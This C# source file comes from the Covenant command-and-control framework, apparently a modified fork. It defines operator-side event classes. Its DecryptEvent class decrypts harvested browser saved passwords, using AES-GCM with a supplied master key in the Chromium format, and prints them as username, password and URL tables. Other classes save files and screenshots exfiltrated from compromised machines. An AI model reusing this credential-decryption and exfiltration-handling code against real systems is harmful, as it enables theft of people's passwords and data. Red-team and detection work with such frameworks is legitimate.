// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.IO;

using Covenant.Core;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Text;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Linq;
using static Donut.Helper;

namespace Covenant.Models.Covenant
{
    public enum EventLevel
    {
        Silent,
        Info,
        Warning,
        Highlight,
        Error
    }

    public enum EventType
    {
        Normal,
        Download,
        Screenshot,
        Decrypt
    }

    public class Event
    {
        public int Id { get; set; }
        public DateTime Time { get; set; } = DateTime.UtcNow;
        public string MessageHeader { get; set; }
        public string MessageBody { get; set; }
        public EventLevel Level { get; set; } = EventLevel.Highlight;
        public EventType Type { get; set; } = EventType.Normal;
		public string Context { get; set; } = "*";
    }

    public class DecryptEvent : Event
    {

        public string EncryptedOutput { get; set; } = "";
        public string DecryptedOutput { get; set; } = "";

        public DecryptEvent()
        {
            this.Type = EventType.Decrypt;
        }

        public bool Decrypt()
        {
           
                string[] lines = EncryptedOutput.Split(Environment.NewLine);

                byte[] key = Convert.FromBase64String(lines[0]);


                DecryptedOutput = "master key decrypted: " + lines[0] + Environment.NewLine;

                DecryptedOutput += "username       :         password       :         url" + Environment.NewLine;
                DecryptedOutput += "______________________________________________________" + Environment.NewLine;

                try
                {
                    foreach (string line in lines)
                    {
                        try
                        {
                        string username = line.Split(':')[0];

                        if(line.Split(':')[1].StartsWith("ENC_"))
                        {
                            byte[] payload = Convert.FromBase64String(line.Split(':')[1].Substring(4));
                            string password = Encoding.Default.GetString(AesGcmDecrypt(key, payload));

                            DecryptedOutput += username + "     :      " + password + "    :    " + line.Split(':')[2] + line.Split(':')[3];
                            DecryptedOutput += Environment.NewLine;
                        }
                        else
                        {

                            DecryptedOutput += username + "     :      " + line.Split(':')[1] + "    :    " + line.Split(':')[2] + line.Split(':')[3];
                            DecryptedOutput += Environment.NewLine;
                        }
                            
                        }
                        catch (Exception)
                        {

                        }


                    }
                }
                catch (Exception x)
                {

                    DecryptedOutput = x.Message + Environment.NewLine + EncryptedOutput;
                }
            return true;
        }


        public static byte[] AesGcmDecrypt( byte[] key, byte[] payload)
        {
            
            byte[] nonce = payload.Skip(3).Take(12).ToArray();
            byte[] realPayload = payload.Skip(15).ToArray(); // from 15 to end


            return AesGcmDecrypt(realPayload, key, nonce);
        }

        public static byte[] AesGcmDecrypt(byte[] payload, byte[] key, byte[] nonce)
        {
            var cipher = new GcmBlockCipher(new AesEngine());
            cipher.Init(false, new AeadParameters(new KeyParameter(key), 128, nonce));

            var clearBytes = new byte[cipher.GetOutputSize(payload.Length)];
            int len = cipher.ProcessBytes(payload, 0, payload.Length, clearBytes, 0);
            cipher.DoFinal(clearBytes, len);
            return clearBytes;
        }

    }

    public class DownloadEvent : Event
    {
        public enum DownloadProgress
        {
            Portion,
            Complete
        }

        public string FileName { get; set; } = "";
        public string FileContents { get; set; } = "";
        public DownloadProgress Progress { get; set; } = DownloadProgress.Portion;

        public DownloadEvent()
        {
            this.Type = EventType.Download;
        }

        public bool WriteToDisk()
        {
            try
            {
                byte[] contents = Convert.FromBase64String(this.FileContents);
                if (this.Progress == DownloadProgress.Complete)
                {
                    File.WriteAllBytes(
                        Path.Combine(Common.CovenantDownloadDirectory, Utilities.GetSanitizedFilename(this.FileName)),
                        contents
                    );
                }
                else
                {
                    using (var stream = new FileStream(Path.Combine(Common.CovenantDownloadDirectory, Utilities.GetSanitizedFilename(this.FileName)), FileMode.Append))
                    {
                        stream.Write(contents, 0, contents.Length);
                    }
                }
                return true;
            }
            catch (FormatException)
            {
                return false;
            }
        }
    }

    public class ScreenshotEvent : DownloadEvent
    {
        public ScreenshotEvent()
        {
            this.Type = EventType.Screenshot;
        }
    }
}
